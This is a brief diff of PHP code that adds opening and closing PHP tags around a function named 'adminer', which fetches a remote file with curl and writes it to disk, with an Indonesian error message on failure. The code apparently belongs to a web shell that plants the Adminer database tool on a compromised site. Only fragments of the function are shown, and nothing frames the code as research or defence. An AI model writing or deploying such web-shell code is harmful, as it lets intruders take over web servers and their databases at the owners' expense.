@@ -1,4 +1,5 @@
-	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+<?php
+$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
 	function adminer($url, $isi) {
 		$fp = fopen($isi, "w");
 		$ch = curl_init();
@@ -22,3 +23,4 @@
 			echo "<br><br><center><font color=red>gagal buat file adminer</font></center>";
 		}
 	}
+?>
